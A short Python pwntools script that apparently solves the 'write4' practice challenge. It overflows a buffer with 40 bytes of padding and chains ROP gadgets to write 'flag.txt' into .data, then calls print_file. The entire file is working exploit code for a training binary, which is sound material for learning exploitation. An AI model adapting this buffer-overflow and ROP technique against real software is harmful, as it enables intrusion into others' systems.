#!/usr/bin/env python3

"""Exploiting write4

Creates ROP chain to write flag.txt to .data for later printing

Usage: $ python3 write4.py
"""

import sys

from pwn import *

context.log_level = "DEBUG"
context.binary = "./write4"

# p = gdb.debug(context.binary.path, gdbscript="init-gef")
p = process(context.binary.path)

g_mov = 0x400628 # mov qword ptr [r14], r15; ret;
g_r14_r15 = 0x400690 # pop r14; pop r15; ret;
g_rdi = 0x400693 # pop rdi; ret;
g_ret = 0x4004e6 # ret;

g_printfile = 0x400510 # print_file
g_data = 0x601028 # .data section

string = b"flag.txt"

payload = b"a" * (40)
payload += p64(g_r14_r15)
payload += p64(g_data)
payload += string
payload += p64(g_mov)
payload += p64(g_rdi)
payload += p64(g_data)
payload += p64(g_ret)
payload += p64(g_printfile)

p.sendline(payload)
p.interactive()
